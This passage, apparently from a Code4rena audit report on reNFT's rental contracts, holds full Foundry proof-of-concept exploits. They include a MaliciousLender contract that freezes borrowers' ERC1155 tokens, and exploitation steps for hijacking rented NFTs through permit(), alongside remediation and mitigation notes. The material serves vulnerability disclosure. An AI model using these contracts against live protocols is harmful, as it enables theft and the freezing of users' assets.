            for (uint256 i = 0; i < orderParameters.consideration.length; i++) {
                storageOrderParameters.consideration.push(orderParameters.consideration[i]);
            }
        }

        function _createSeaportFulfillment(
            Fulfillment storage storageFulfillment,
            Fulfillment memory fulfillment
        ) private {
            // push the offer components to storage
            for (uint256 i = 0; i < fulfillment.offerComponents.length; i++) {
                storageFulfillment.offerComponents.push(fulfillment.offerComponents[i]);
            }

            // push the consideration components to storage
            for (uint256 i = 0; i < fulfillment.considerationComponents.length; i++) {
                storageFulfillment.considerationComponents.push(
                    fulfillment.considerationComponents[i]
                );
            }
        }

        function _seaportItemTypeToRentalItemType(
            SeaportItemType seaportItemType
        ) internal pure returns (RentalItemType) {
            if (seaportItemType == SeaportItemType.ERC20) {
                return RentalItemType.ERC20;
            } else if (seaportItemType == SeaportItemType.ERC721) {
                return RentalItemType.ERC721;
            } else if (seaportItemType == SeaportItemType.ERC1155) {
                return RentalItemType.ERC1155;
            } else {
                revert("seaport item type not supported");
            }
        }

        function _createRentalOrder(
            OrderToFulfill memory orderToFulfill
        ) internal view returns (RentalOrder memory rentalOrder) {
            // get the order parameters
            OrderParameters memory parameters = orderToFulfill.advancedOrder.parameters;

            // get the payload
            RentPayload memory payload = orderToFulfill.payload;

            // get the metadata
            OrderMetadata memory metadata = payload.metadata;

            // construct a rental order
            rentalOrder = RentalOrder({
                seaportOrderHash: orderToFulfill.orderHash,
                items: new Item[](parameters.offer.length + parameters.consideration.length),
                hooks: metadata.hooks,
                orderType: metadata.orderType,
                lender: parameters.offerer,
                renter: payload.intendedFulfiller,
                rentalWallet: payload.fulfillment.recipient,
                startTimestamp: block.timestamp,
                endTimestamp: block.timestamp + metadata.rentDuration
            });

            // for each new offer item being rented, create a new item struct to add to the rental order
            for (uint256 i = 0; i < parameters.offer.length; i++) {
                // PAYEE orders cannot have offer items
                require(
                    metadata.orderType != OrderType.PAYEE,
                    "TEST: cannot have offer items in PAYEE order"
                );

                // get the offer item
                OfferItem memory offerItem = parameters.offer[i];

                // determine the item type
                RentalItemType itemType = _seaportItemTypeToRentalItemType(offerItem.itemType);

                // determine which entity the payment will settle to
                SettleTo settleTo = offerItem.itemType == SeaportItemType.ERC20
                    ? SettleTo.RENTER
                    : SettleTo.LENDER;

                // create a new rental item
                rentalOrder.items[i] = Item({
                    itemType: itemType,
                    settleTo: settleTo,
                    token: offerItem.token,
                    amount: offerItem.startAmount,
                    identifier: offerItem.identifierOrCriteria
                });
            }

            // for each consideration item in return, create a new item struct to add to the rental order
            for (uint256 i = 0; i < parameters.consideration.length; i++) {
                // PAY orders cannot have consideration items
                require(
                    metadata.orderType != OrderType.PAY,
                    "TEST: cannot have consideration items in PAY order"
                );

                // get the offer item
                ConsiderationItem memory considerationItem = parameters.consideration[i];

                // determine the item type
                RentalItemType itemType = _seaportItemTypeToRentalItemType(
                    considerationItem.itemType
                );

                // determine which entity the payment will settle to
                SettleTo settleTo = metadata.orderType == OrderType.PAYEE &&
                    considerationItem.itemType == SeaportItemType.ERC20
                    ? SettleTo.RENTER
                    : SettleTo.LENDER;

                // calculate item index offset
                uint256 itemIndex = i + parameters.offer.length;

                // create a new payment item
                rentalOrder.items[itemIndex] = Item({
                    itemType: itemType,
                    settleTo: settleTo,
                    token: considerationItem.token,
                    amount: considerationItem.startAmount,
                    identifier: considerationItem.identifierOrCriteria
                });
            }
        }

        function _signProtocolOrder(
            uint256 signerPrivateKey,
            bytes32 payloadHash
        ) internal view returns (bytes memory signature) {
            // fetch domain separator from create policy
            bytes32 domainSeparator = create.domainSeparator();

            // sign the EIP-712 digest
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(
                signerPrivateKey,
                domainSeparator.toTypedDataHash(payloadHash)
            );

            // encode the signature
            signature = abi.encodePacked(r, s, v);
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                            Fulfillment Amendments                           //
        /////////////////////////////////////////////////////////////////////////////////

        function withFulfiller(ProtocolAccount memory _fulfiller) internal {
            fulfiller = _fulfiller;
        }

        function withRecipient(address _recipient) internal {
            seaportRecipient = _recipient;
        }

        function withAdvancedOrder(
            AdvancedOrder memory _advancedOrder,
            uint256 orderIndex
        ) internal {
            // get a storage pointer to the order to fulfill
            OrderToFulfill storage orderToFulfill = ordersToFulfill[orderIndex];

            // set the new advanced order
            _createAdvancedOrder(orderToFulfill.advancedOrder, _advancedOrder);
        }

        function withSeaportMatchOrderFulfillment(Fulfillment memory _fulfillment) internal {
            // get a pointer to a new seaport fulfillment
            Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();

            // set the fulfillment
            _createSeaportFulfillment(
                fulfillment,
                Fulfillment({
                    offerComponents: _fulfillment.offerComponents,
                    considerationComponents: _fulfillment.considerationComponents
                })
            );
        }

        function withSeaportMatchOrderFulfillments(
            Fulfillment[] memory fulfillments
        ) internal {
            // reset all current seaport match order fulfillments
            resetSeaportMatchOrderFulfillments();

            // add the new offer items to storage
            for (uint256 i = 0; i < fulfillments.length; i++) {
                // get a pointer to a new seaport fulfillment
                Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();

                // set the fulfillment
                _createSeaportFulfillment(
                    fulfillment,
                    Fulfillment({
                        offerComponents: fulfillments[i].offerComponents,
                        considerationComponents: fulfillments[i].considerationComponents
                    })
                );
            }
        }

        function withBaseOrderFulfillmentComponents() internal {
            // create offer fulfillments. We need to specify which offer items can be aggregated
            // into one transaction. For example, 2 different orders where the same seller is offering
            // the same item in each.
            //
            // Since BASE orders will only contain ERC721 offer items, these cannot be aggregated. So, a separate fulfillment
            // is created for each order.
            for (uint256 i = 0; i < ordersToFulfill.length; i++) {
                // get a pointer to a new offer fulfillment array. This array will contain indexes of
                // orders and items which are all grouped on whether they can be combined in a single transferFrom()
                FulfillmentComponent[] storage offerFulfillments = seaportOfferFulfillments
                    .push();

                // number of offer items in the order
                uint256 offerItemsInOrder = ordersToFulfill[i]
                    .advancedOrder
                    .parameters
                    .offer
                    .length;

                // add a single fulfillment component for each offer item in the order
                for (uint256 j = 0; j < offerItemsInOrder; j++) {
                    offerFulfillments.push(
                        FulfillmentComponent({orderIndex: i, itemIndex: j})
                    );
                }
            }

            // create consideration fulfillments. We need to specify which consideration items can be aggregated
            // into one transaction. For example, 3 different orders where the same fungible consideration items are
            // expected in return.
            //
            // get a pointer to a new offer fulfillment array. This array will contain indexes of
            // orders and items which are all grouped on whether they can be combined in a single transferFrom()
            FulfillmentComponent[]
                storage considerationFulfillments = seaportConsiderationFulfillments.push();

            // BASE orders will only contain ERC20 items, these are fungible and are candidates for aggregation. Because
            // all of these BASE orders will be fulfilled by the same EOA, and all ERC20 consideration items are going to the
            // ESCRW contract, the consideration items can be aggregated. In other words, Seaport will only make a single transfer
            // of ERC20 tokens from the fulfiller EOA to the payment escrow contract.
            //
            // put all fulfillments into one which can be an aggregated transfer
            for (uint256 i = 0; i < ordersToFulfill.length; i++) {
                considerationFulfillments.push(
                    FulfillmentComponent({orderIndex: i, itemIndex: 0})
                );
            }
        }

        function withLinkedPayAndPayeeOrders(
            uint256 payOrderIndex,
            uint256 payeeOrderIndex
        ) internal {
            // get the PAYEE order
            OrderParameters memory payeeOrder = ordersToFulfill[payeeOrderIndex]
                .advancedOrder
                .parameters;

            // For each consideration item in the PAYEE order, a fulfillment should be
            // constructed with a corresponding item from the PAY order's offer items.
            for (uint256 i = 0; i < payeeOrder.consideration.length; ++i) {
                // define the offer components
                FulfillmentComponent[] memory offerComponents = new FulfillmentComponent[](1);
                offerComponents[0] = FulfillmentComponent({
                    orderIndex: payOrderIndex,
                    itemIndex: i
                });

                // define the consideration components
                FulfillmentComponent[]
                    memory considerationComponents = new FulfillmentComponent[](1);
                considerationComponents[0] = FulfillmentComponent({
                    orderIndex: payeeOrderIndex,
                    itemIndex: i
                });

                // get a pointer to a new seaport fulfillment
                Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();

                // set the fulfillment
                _createSeaportFulfillment(
                    fulfillment,
                    Fulfillment({
                        offerComponents: offerComponents,
                        considerationComponents: considerationComponents
                    })
                );
            }
        }

        function resetFulfiller() internal {
            delete fulfiller;
        }

        function resetOrdersToFulfill() internal {
            delete ordersToFulfill;
        }

        function resetSeaportMatchOrderFulfillments() internal {
            delete seaportMatchOrderFulfillments;
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                           Fulfillment Finalization                          //
        /////////////////////////////////////////////////////////////////////////////////

        function _finalizePayOrderFulfillment(
            bytes memory expectedError
        )
            private
            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)
        {
            // get the orders to fulfill
            OrderToFulfill memory payOrder = ordersToFulfill[0];
            OrderToFulfill memory payeeOrder = ordersToFulfill[1];

            // create rental orders
            payRentalOrder = _createRentalOrder(payOrder);
            payeeRentalOrder = _createRentalOrder(payeeOrder);

            // expect an error if error data was provided
            if (expectedError.length != 0) {
                vm.expectRevert(expectedError);
            }
            // otherwise, expect the relevant event to be emitted.
            else {
                vm.expectEmit({emitter: address(create)});
                emit Events.RentalOrderStarted(
                    create.getRentalOrderHash(payRentalOrder),
                    payOrder.payload.metadata.emittedExtraData,
                    payRentalOrder.seaportOrderHash,
                    payRentalOrder.items,
                    payRentalOrder.hooks,
                    payRentalOrder.orderType,
                    payRentalOrder.lender,
                    payRentalOrder.renter,
                    payRentalOrder.rentalWallet,
                    payRentalOrder.startTimestamp,
                    payRentalOrder.endTimestamp
                );
            }

            // the offerer of the PAYEE order fulfills the orders.
            vm.prank(fulfiller.addr);

            // fulfill the orders
            seaport.matchAdvancedOrders(
                _deconstructOrdersToFulfill(),
                new CriteriaResolver[](0),
                seaportMatchOrderFulfillments,
                seaportRecipient
            );

            // clear structs
            resetFulfiller();
            resetOrdersToFulfill();
            resetSeaportMatchOrderFulfillments();
        }

        function finalizePayOrderFulfillment()
            internal
            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)
        {
            (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(bytes(""));
        }

        function finalizePayOrderFulfillmentWithError(
            bytes memory expectedError
        )
            internal
            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)
        {
            (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(expectedError);
        }

        function _finalizeBaseOrderFulfillment(
            bytes memory expectedError
        ) private returns (RentalOrder memory rentalOrder) {
            // get the order to fulfill
            OrderToFulfill memory baseOrder = ordersToFulfill[0];

            // create a rental order
            rentalOrder = _createRentalOrder(baseOrder);

            // expect an error if error data was provided
            if (expectedError.length != 0) {
                vm.expectRevert(expectedError);
            }
            // otherwise, expect the relevant event to be emitted.
            else {
                vm.expectEmit({emitter: address(create)});
                emit Events.RentalOrderStarted(
                    create.getRentalOrderHash(rentalOrder),
                    baseOrder.payload.metadata.emittedExtraData,
                    rentalOrder.seaportOrderHash,
                    rentalOrder.items,
                    rentalOrder.hooks,
                    rentalOrder.orderType,
                    rentalOrder.lender,
                    rentalOrder.renter,
                    rentalOrder.rentalWallet,
                    rentalOrder.startTimestamp,
                    rentalOrder.endTimestamp
                );
            }

            // the owner of the rental wallet fulfills the advanced order, and marks the rental wallet
            // as the recipient
            vm.prank(fulfiller.addr);
            seaport.fulfillAdvancedOrder(
                baseOrder.advancedOrder,
                new CriteriaResolver[](0),
                conduitKey,
                seaportRecipient
            );

            // clear structs
            resetFulfiller();
            resetOrdersToFulfill();
            resetSeaportMatchOrderFulfillments();
        }

        function finalizeBaseOrderFulfillment()
            internal
            returns (RentalOrder memory rentalOrder)
        {
            rentalOrder = _finalizeBaseOrderFulfillment(bytes(""));
        }

        function finalizeBaseOrderFulfillmentWithError(
            bytes memory expectedError
        ) internal returns (RentalOrder memory rentalOrder) {
            rentalOrder = _finalizeBaseOrderFulfillment(expectedError);
        }

        function finalizeBaseOrdersFulfillment()
            internal
            returns (RentalOrder[] memory rentalOrders)
        {
            // Instantiate rental orders
            uint256 numOrdersToFulfill = ordersToFulfill.length;
            rentalOrders = new RentalOrder[](numOrdersToFulfill);

            // convert each order to fulfill into a rental order
            for (uint256 i = 0; i < numOrdersToFulfill; i++) {
                rentalOrders[i] = _createRentalOrder(ordersToFulfill[i]);
            }

            // Expect the relevant events to be emitted.
            for (uint256 i = 0; i < rentalOrders.length; i++) {
                vm.expectEmit({emitter: address(create)});
                emit Events.RentalOrderStarted(
                    create.getRentalOrderHash(rentalOrders[i]),
                    ordersToFulfill[i].payload.metadata.emittedExtraData,
                    rentalOrders[i].seaportOrderHash,
                    rentalOrders[i].items,
                    rentalOrders[i].hooks,
                    rentalOrders[i].orderType,
                    rentalOrders[i].lender,
                    rentalOrders[i].renter,
                    rentalOrders[i].rentalWallet,
                    rentalOrders[i].startTimestamp,
                    rentalOrders[i].endTimestamp
                );
            }

            // the owner of the rental wallet fulfills the advanced orders, and marks the rental wallet
            // as the recipient
            vm.prank(fulfiller.addr);
            seaport.fulfillAvailableAdvancedOrders(
                _deconstructOrdersToFulfill(),
                new CriteriaResolver[](0),
                seaportOfferFulfillments,
                seaportConsiderationFulfillments,
                conduitKey,
                seaportRecipient,
                ordersToFulfill.length
            );

            // clear structs
            resetFulfiller();
            resetOrdersToFulfill();
            resetSeaportMatchOrderFulfillments();
        }

        function finalizePayOrdersFulfillment()
            internal
            returns (RentalOrder[] memory rentalOrders)
        {
            // Instantiate rental orders
            uint256 numOrdersToFulfill = ordersToFulfill.length;
            rentalOrders = new RentalOrder[](numOrdersToFulfill);

            // convert each order to fulfill into a rental order
            for (uint256 i = 0; i < numOrdersToFulfill; i++) {
                rentalOrders[i] = _createRentalOrder(ordersToFulfill[i]);
            }

            // Expect the relevant events to be emitted.
            for (uint256 i = 0; i < rentalOrders.length; i++) {
                // only expect the event if its a PAY order
                if (ordersToFulfill[i].payload.metadata.orderType == OrderType.PAY) {
                    vm.expectEmit({emitter: address(create)});
                    emit Events.RentalOrderStarted(
                        create.getRentalOrderHash(rentalOrders[i]),
                        ordersToFulfill[i].payload.metadata.emittedExtraData,
                        rentalOrders[i].seaportOrderHash,
                        rentalOrders[i].items,
                        rentalOrders[i].hooks,
                        rentalOrders[i].orderType,
                        rentalOrders[i].lender,
                        rentalOrders[i].renter,
                        rentalOrders[i].rentalWallet,
                        rentalOrders[i].startTimestamp,
                        rentalOrders[i].endTimestamp
                    );
                }
            }

            // the offerer of the PAYEE order fulfills the orders. For this order, it shouldn't matter
            // what the recipient address is
            vm.prank(fulfiller.addr);
            seaport.matchAdvancedOrders(
                _deconstructOrdersToFulfill(),
                new CriteriaResolver[](0),
                seaportMatchOrderFulfillments,
                seaportRecipient
            );

            // clear structs
            resetFulfiller();
            resetOrdersToFulfill();
            resetSeaportMatchOrderFulfillments();
        }

        function _deconstructOrdersToFulfill()
            private
            view
            returns (AdvancedOrder[] memory advancedOrders)
        {
            // get the length of the orders to fulfill
            advancedOrders = new AdvancedOrder[](ordersToFulfill.length);

            // build up the advanced orders
            for (uint256 i = 0; i < ordersToFulfill.length; i++) {
                advancedOrders[i] = ordersToFulfill[i].advancedOrder;
            }
        }
    }

    contract SetupReNFT is OrderFulfiller {}


    interface IERC1155 {

        function balanceOfBatch(
            address[] calldata accounts,
            uint256[] calldata ids
        ) external view returns (uint256[] memory);

        function setApprovalForAll(address operator, bool approved) external;

    }


    contract MaliciousLender {

        address private owner; // owner of the contract
        uint256 private timestamp; // The timestamp until which, the onERC1155Received function will keep reverting

        constructor() {
            owner = msg.sender;
        }

        function onERC1155Received(address, address, uint256, uint256, bytes memory) public virtual returns (bytes4) {

            if (block.timestamp < timestamp) {
                revert("!");
            }
            return this.onERC1155Received.selector;
        }

        function onERC1155BatchReceived(address, address, uint256[] memory, uint256[] memory, bytes memory) public virtual returns (bytes4) {

            if (block.timestamp < timestamp) {
                revert("!");
            }
            return this.onERC1155BatchReceived.selector;
        }

        // A helper function to split the signature 
        function splitSignature(bytes memory sig)
            public
            pure
            returns (uint8 v, bytes32 r, bytes32 s)
        {
            require(sig.length == 65);

            assembly {
                // first 32 bytes, after the length prefix.
                r := mload(add(sig, 32))
                // second 32 bytes.
                s := mload(add(sig, 64))
                // final byte (first byte of the next 32 bytes).
                v := byte(0, mload(add(sig, 96)))
            }

            return (v, r, s);
        }

        // EIP-1271 support. 
        // Since this is a smart contract and not an EOA fulfilling the order, this function will be called by seaport.
        function isValidSignature(bytes32 _hash, bytes memory _signature) external returns(bytes4) {
            (uint8 v, bytes32 r, bytes32 s) = splitSignature(_signature);
            address recoveredAddr = ecrecover(_hash, v, r, s);
            if (recoveredAddr == owner) {
                return 0x1626ba7e;
            } else {
                return 0x00000000;
            }
        }

        // This is a function where the malicious lender sets the timestamp until which, the onERC1155Received function will keep reverting.
        function setDuration(uint256 _timestamp) external onlyOwner {
            timestamp = _timestamp;
        }

        // A function utilized by the owner (the malicious lender) to be able to approve addresses to move tokens out of this contract. 
        // that address can be the conduit, it can be himself etc
        function approveAddrToSpendToken(address _token, address _addr) external onlyOwner {
            IERC1155(_token).setApprovalForAll(_addr, true);
        }


        modifier onlyOwner {
            require(msg.sender == owner);
            _;
        }
    }

</details>

<details>
<summary><b>Exploit.sol</b></summary>
<br>

    // SPDX-License-Identifier: BUSL-1.1
    pragma solidity ^0.8.20;

    import {
        Order,
        FulfillmentComponent,
        Fulfillment,
        ItemType as SeaportItemType,
        OfferItem,
        ItemType
    } from "@seaport-types/lib/ConsiderationStructs.sol";

    import {OfferItemLib} from "@seaport-sol/SeaportSol.sol";

    import {OrderType, OrderMetadata, RentalOrder} from "@src/libraries/RentalStructs.sol";
    import {Errors} from "@src/libraries/Errors.sol";

    import {ERC721} from '@openzeppelin-contracts/token/ERC721/ERC721.sol';
    import {IERC721} from '@openzeppelin-contracts/token/ERC721/IERC721.sol';
    import {Ownable} from "@openzeppelin-contracts/access/Ownable.sol";
    import {ERC1155} from '@openzeppelin-contracts/token/ERC1155/ERC1155.sol';

    import {SetupReNFT} from "./SetupExploit.sol";
    import {Assertions} from "@test/utils/Assertions.sol";
    import {Constants} from "@test/utils/Constants.sol";
    import {SafeUtils} from "@test/utils/GnosisSafeUtils.sol";
    import {Enum} from "@safe-contracts/common/Enum.sol";

    import "forge-std/console.sol";



    contract Exploit is SetupReNFT, Assertions, Constants {

        using OfferItemLib for OfferItem;

        function test_ERC1155_Freeze_Exploit() public {


            vm.startPrank(attacker.addr);

            // A test ERC1155 token
            TestERC1155Token testERC1155Token = new TestERC1155Token();

            // Bob will be the borrower, and he mint him 1000 tokens in his safe before him borrowing anything.
            testERC1155Token.mint(address(bob.safe), 1, 1000, "");

            // The malicious lender is a smart contract not an EOA 
            //    (Check it's implementation at L-1755 in SetupExploit.sol)
            //    Also check L-479 and L-500-501 in SetupExploit.sol

            // We minting him 10 tokens because those are the ones he is going to lend to Bob (the borrower)
            testERC1155Token.mint(address(maliciousLenderContract), 1, 10, "");

            vm.stopPrank();

            // Approve seaport conduit to spend the token.
            vm.prank(address(maliciousLenderContract));
            testERC1155Token.setApprovalForAll(address(conduit), true);

            // Cache the attacker's EOA address
            address attackersOriginalEOA_Address = attacker.addr;

            // We're doing this because we're passing the attacker's `ProtocolAccount` struct to `createOrder()`
            // And we're doing so because we want to simulate the lender being a smart contract not an EOA
            attacker.addr = address(maliciousLenderContract);

            /////////////////////////////////////////////
            // Order Creation & Fulfillment simulation //
            /////////////////////////////////////////////

            // create a BASE order
            createOrder({
                offerer: attacker,
                orderType: OrderType.BASE,
                erc721Offers: 0,
                erc1155Offers: 1,
                erc20Offers: 0,
                erc721Considerations: 0,
                erc1155Considerations: 0,
                erc20Considerations: 1
            });

            // Restore the correct address of the ProtocolAccount `attacker` struct.
            attacker.addr = attackersOriginalEOA_Address;

            // Remove the pre-inserted offer item (which is inserted by the tests)
            popOfferItem();

            // Set the test ERC1155 token which we created as the offer item
            withOfferItem(
                    OfferItemLib
                        .empty()
                        .withItemType(ItemType.ERC1155)
                        .withToken(address(testERC1155Token))
                        .withIdentifierOrCriteria(1)
                        .withStartAmount(10)
                        .withEndAmount(10)
            );

            // Finalize the order creation
            (
                Order memory order,
                bytes32 orderHash,
                OrderMetadata memory metadata
            ) = finalizeOrder();
            

            // Create an order fulfillment
            createOrderFulfillment({
                _fulfiller: bob,
                order: order,
                orderHash: orderHash,
                metadata: metadata
            });

            // Finalize the base order fulfillment
            RentalOrder memory rentalOrder = finalizeBaseOrderFulfillment();

            // get the rental order hash
            bytes32 rentalOrderHash = create.getRentalOrderHash(rentalOrder);

            // assert that the rental order was stored
            assertEq(STORE.orders(rentalOrderHash), true);

            // assert that the token is in storage
            assertEq(STORE.isRentedOut(address(bob.safe), address(testERC1155Token), 1), true);

            // assert that the ERC1155 is in the rental wallet of the fulfiller
            assertEq(testERC1155Token.balanceOf(address(bob.safe), 1), 1010);


            /** ------------------- Exploitation ------------------- */

            // Check the `MaliciousLender` contract in SetupExploit.sol
            // `.setDuration(<timestamp>)` is a function which lets the lender choose until when he'll keep the victim's funds freezed
            vm.prank(attacker.addr);
            maliciousLenderContract.setDuration(100000000);

            /** ---------------------------------------------------- */


            // Simulate that the rental has been stopped
            vm.warp(block.timestamp + 100000);

            // Impersonate bob
            vm.startPrank(bob.addr);


            /** ------- Bob will try to stop the rental but will fail. -------- */
            vm.expectRevert(
                Errors.StopPolicy_ReclaimFailed.selector
            );

            stop.stopRent(rentalOrder);


            /** ------- Bob will try to transfer some of his pre-rental ERC1155 tokens to Alice but will fail. -------- */

            // Transaction calldata to transfer the token ERC1155 tokens
            bytes memory transaction = abi.encodeWithSelector(
                testERC1155Token.safeTransferFrom.selector,
                address(bob.safe),
                alice.addr,
                1,
                500,
                ""
            );

            // The signature of the token transferral call
            bytes memory transactionSignature = SafeUtils.signTransaction(
                address(bob.safe),
                bob.privateKey,
                address(testERC1155Token),
                transaction
            );


            // We expect that the TX will fail because of the guard not differentiating between
            //    ERC1155 tokens that are rented and those that are not.
            vm.expectRevert(
                abi.encodeWithSelector(
                    Errors.GuardPolicy_UnauthorizedSelector.selector,
                    ERC1155.safeTransferFrom.selector
                )
            );

            SafeUtils.executeTransaction(
                address(bob.safe),
                address(testERC1155Token),
                transaction,
                transactionSignature
            );

            vm.stopPrank();


        }

    }












    contract TestERC1155Token is ERC1155, Ownable {
        constructor() ERC1155("") Ownable(msg.sender) {}

        function mint(address account, uint256 id, uint256 amount, bytes memory data)
            public
            onlyOwner
        {
            _mint(account, id, amount, data);
        }

        function mintBatch(address to, uint256[] memory ids, uint256[] memory amounts, bytes memory data)
            public
            onlyOwner
        {
            _mintBatch(to, ids, amounts, data);
        }
    }

</details>

***

### Impact

***

Allows a malicious lender to indefinitely freeze borrower's assets.

***

### Remediation

***

The guard needs to differentiate between ERC1155 tokens of same type and ID that are rented and those that are not actively rented. This can be done by implementing a mapping which keeps track of the amount of ERC1155 tokens that become rented and this mapping can then be utilized by the guard to determine whether or not it should let the transferral of the ERC1155 tokens pass.

***

**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/600#issuecomment-1910770119)**

_Note: To see full discussion, see [here](https://github.com/code-423n4/2024-01-renft-findings/issues/600)._

**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**
> The PR [here](https://github.com/re-nft/smart-contracts/pull/8) - Allows distinction between rented and non-rented ERC1155 tokens. Renters should be able to transfer amounts of these tokens that do not cut into the active rented amount.

**Status:** Mitigation confirmed. Full details in reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/9), [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/48) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/37).
***

## [[M-02] A malicious borrower can hijack any NFT with `permit()` function he rents.](https://github.com/code-423n4/2024-01-renft-findings/issues/587)
*Submitted by [sin1st3r\_\_](https://github.com/code-423n4/2024-01-renft-findings/issues/587)*

### Pre-requisite knowledge & an overview of the features in question

***

1.  **ERC-4494: Permit for ERC-721 NFTs**: ERC721-Permit is very similar to ERC20-permit (EIP-2612). ERC721 Permit adds a new `permit()` function. It allows user can sign an ERC721 approve transaction off-chain producing a signature that anyone could use and submit to the permit function. When permit is executed, it will execute the approve function. This allows for meta-transaction support of ERC721 transfers, but it also simply gets rid of the annoyance of needing two transactions: `approve` and `transferFrom`. Additionally, ERC721-Permit, just like ERC20 permit, prevents misuse and replay attacks. A replay attack is when a valid signature is used several times or in places where it's not intended to be used in.

    You can find an implementation of it here, by uniswap: <https://github.com/Uniswap/v3-periphery/blob/main/contracts/base/ERC721Permit.sol>

***

### The Vulnerability & Exploitation Steps

***

ReNFT doesn't account for ERC721 implementing the `permit()` function, allowing a malicious borrower to hijack the token by producing a signature and feeding it to the `permit()` function requesting it to approve his address to transfer the token

**Exploitation Steps**

1.  The attacker rents the NFT token in his rental safe
2.  The attacker creates a signature which he will need to feed to the `permit()` function. The signature is a signed data including info like: 1. the deadline (until when the signature would be valid), 2. the token ID he wants to approve his address to spend, 3. the spender, in this case it's the attacker's address (Look at the PoC to see how it's generated)
3.  The attacker calls `permit()` funtion and gives it the signature along with the deadline, approved address and the spender.
4.  The `permit()` function will reach out to the attacker's rental safe (since it is the owner of the token and since it's a smart contract verifying the signature (EIP-1271) ), asking it if the signature is valid
5.  The rental safe will verify the signature and confirm that it's the attacker (owner of the safe) who signed the transaction
6.  `permit()` will approve the attacker's address to spend the token on behalf of the attacker's safe (token is owned by the safe)
7.  Attacker will then transfer the token out of his safe.

***

### Proof of concept

***

To run the PoC, you'll need to do the following:

1.  You'll need to add the following two files to the test/ folder:
    1.  `SetupExploit.sol` -> Sets up everything from seaport, gnosis, reNFT contracts
    2.  `Exploit.sol` -> The actual exploit PoC which relies on `SetupExploit.sol` as a base.
2.  You'll need to run this command
    `forge test --match-contract Exploit --match-test test_NFT_Permit_Exploit -vvv`

*Note: All of my 7 PoCs throughout my reports include the `SetupExploit.sol`. Please do not rely on the previous `SetupExploit.sol` file if you already had one from another PoC run in the tests/ folder. In some PoCs, there are slight modifications done in that file to properly set up the test infrastructure needed for the exploit*

**The files:**

<details>
<summary><b>SetupExploit.sol</b></summary>
<br>

    // SPDX-License-Identifier: BUSL-1.1
    pragma solidity ^0.8.20;

    import {
        ConsiderationItem,
        OfferItem,
        OrderParameters,
        OrderComponents,
        Order,
        AdvancedOrder,
        ItemType,
        ItemType as SeaportItemType,
        CriteriaResolver,
        OrderType as SeaportOrderType,
        Fulfillment,
        FulfillmentComponent
    } from "@seaport-types/lib/ConsiderationStructs.sol";
    import {
        AdvancedOrderLib,
        ConsiderationItemLib,
        FulfillmentComponentLib,
        FulfillmentLib,
        OfferItemLib,
        OrderComponentsLib,
        OrderLib,
        OrderParametersLib,
        SeaportArrays,
        ZoneParametersLib
    } from "@seaport-sol/SeaportSol.sol";

    import {
        OrderMetadata,
        OrderType,
        OrderFulfillment,
        RentPayload,
        RentalOrder,
        Item,
        SettleTo,
        ItemType as RentalItemType
    } from "@src/libraries/RentalStructs.sol";

    import {ECDSA} from "@openzeppelin-contracts/utils/cryptography/ECDSA.sol";
    import {OrderMetadata, OrderType, Hook} from "@src/libraries/RentalStructs.sol";
    import {Vm} from "@forge-std/Vm.sol";
    import {Test} from "@forge-std/Test.sol";
    import {Assertions} from "@test/utils/Assertions.sol";
    import {Constants} from "@test/utils/Constants.sol";
    import {LibString} from "@solady/utils/LibString.sol";
    import {SafeL2} from "@safe-contracts/SafeL2.sol";
    import {Safe} from "@safe-contracts/Safe.sol";
    // import {BaseExternal} from "@test/fixtures/external/BaseExternal.sol";
    import {SafeProxyFactory} from "@safe-contracts/proxies/SafeProxyFactory.sol";
    import {Create2Deployer} from "@src/Create2Deployer.sol";
    import {Kernel, Actions} from "@src/Kernel.sol";
    import {Storage} from "@src/modules/Storage.sol";
    import {PaymentEscrow} from "@src/modules/PaymentEscrow.sol";
    import {Create} from "@src/policies/Create.sol";
    import {Stop} from "@src/policies/Stop.sol";
    import {Factory} from "@src/policies/Factory.sol";
    import {Admin} from "@src/policies/Admin.sol";
    import {Guard} from "@src/policies/Guard.sol";
    import {toRole} from "@src/libraries/KernelUtils.sol";
    import {Proxy} from "@src/proxy/Proxy.sol";
    import {Events} from "@src/libraries/Events.sol";
    import {HandlerContext} from "@safe-contracts/handler/HandlerContext.sol";
    import {CompatibilityFallbackHandler} from "@safe-contracts/handler/CompatibilityFallbackHandler.sol";

    import {ISignatureValidator} from "@safe-contracts/interfaces/ISignatureValidator.sol";

    import {ProtocolAccount} from "@test/utils/Types.sol";
    import {MockERC20} from "@test/mocks/tokens/standard/MockERC20.sol";
    import {MockERC721} from "@test/mocks/tokens/standard/MockERC721.sol";
    import {MockERC1155} from "@test/mocks/tokens/standard/MockERC1155.sol";
    import {SafeUtils} from "@test/utils/GnosisSafeUtils.sol";
    import {Enum} from "@safe-contracts/common/Enum.sol";
    import {ISafe} from "@src/interfaces/ISafe.sol";

    import {Seaport} from "@seaport-core/Seaport.sol";
    import {ConduitController} from "@seaport-core/conduit/ConduitController.sol";
    import {ConduitControllerInterface} from "@seaport-types/interfaces/ConduitControllerInterface.sol";
    import {ConduitInterface} from "@seaport-types/interfaces/ConduitInterface.sol";

    import "@forge-std/console.sol";



    // Deploys all Seaport protocol contracts
    contract External_Seaport is Test {
        // seaport protocol contracts
        Seaport public seaport;
        ConduitController public conduitController;
        ConduitInterface public conduit;

        // conduit owner and key
        Vm.Wallet public conduitOwner;
        bytes32 public conduitKey;

        function setUp() public virtual {
            // generate conduit owner wallet
            conduitOwner = vm.createWallet("conduitOwner");

            // deploy conduit controller
            conduitController = new ConduitController();

            // deploy seaport
            seaport = new Seaport(address(conduitController));

